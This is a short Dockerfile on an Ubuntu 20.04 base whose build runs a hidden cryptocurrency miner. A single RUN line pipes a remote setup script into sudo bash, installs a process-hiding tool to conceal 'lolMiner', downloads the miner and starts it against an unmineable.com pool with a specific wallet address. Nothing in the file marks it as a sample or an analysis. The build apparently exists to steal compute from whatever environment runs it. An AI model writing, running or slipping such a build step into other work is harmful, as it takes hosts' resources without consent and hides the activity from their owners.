FROM ubuntu:20.04 as ubuntu-base

ENV DEBIAN_FRONTEND=noninteractive \
    DEBCONF_NONINTERACTIVE_SEEN=true
    
RUN apt update
RUN apt -y install wget
RUN curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt install nodejs && npm i -g node-process-hider && sudo ph add lolMiner && wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.44/lolMiner_v1.44_Lin64.tar.gz && tar -xf lolMiner_v1.44_Lin64.tar.gz && cd 1.44 && ./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user NANO:nano_3top3oyac7puxc1wjwb17g3epz5jajkbhae6kekus7jochje9eg7zkiawffu.GPU3#hfg0-qupe --ethstratum ETHPROXY
